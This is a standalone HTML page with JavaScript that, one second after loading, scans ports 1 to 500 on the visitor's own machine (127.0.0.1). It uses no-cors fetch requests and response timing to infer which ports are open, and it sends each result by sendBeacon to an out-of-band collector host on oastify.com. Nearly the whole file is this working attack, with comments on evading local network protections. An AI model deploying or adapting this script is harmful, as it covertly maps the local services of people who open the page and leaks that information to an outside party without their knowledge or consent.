<!DOCTYPE html>
<html>
<head>
    <title>Throttled Port Scanner (50 RPS)</title>
</head>
<body>
    <h3 id="status">Ready to scan 127.0.0.1...</h3>
    <script>
        const target = "127.0.0.1";
        const collabo = "dj0qlo1xzjmknnafrdiv6k8mhdn4buzj.oastify.com";
        const startPort = 1;
        const endPort = 500;
        const delayMs = 20; // 50 requests per second

        const sleep = (ms) => new Promise(res => setTimeout(res, ms));

        async function exfiltrate(port, status) {
            // Using Beacon API or Image for OOB exfiltration
            // Beacons are less likely to be killed during page refreshes
            navigator.sendBeacon(`https://${collabo}/log?p=${port}&s=${status}`);
        }

        async function checkPort(port) {
            const start = performance.now();
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 1000);

            try {
                // 'no-cors' is essential for probing local IPs from a public origin
                await fetch(`http://${target}:${port}`, { mode: 'no-cors', signal: controller.signal });
                exfiltrate(port, "OPEN");
            } catch (err) {
                const duration = performance.now() - start;
                // Timing logic: Closed ports reset immediately (< 5ms)
                // Open ports (even if blocked by LNA) take longer to resolve/error
                if (duration > 15 || err.name === 'AbortError') {
                    exfiltrate(port, "OPEN_OR_FILTERED");
                }
            } finally {
                clearTimeout(timeoutId);
            }
        }

        async function startScan() {
            document.getElementById('status').innerText = "Scanning at 50 RPS...";
            
            for (let port = startPort; port <= endPort; port++) {
                // Fire the request without 'awaiting' the network result 
                // but 'awaiting' the timer to maintain 50 RPS
                checkPort(port); 
                await sleep(delayMs); 
            }

            document.getElementById('status').innerText = "Scan Complete.";
            navigator.sendBeacon(`https://${collabo}/FINISHED`);
        }

        // Delay start by 1s to ensure page is fully loaded
        setTimeout(startScan, 1000);
    </script>
</body>
</html>
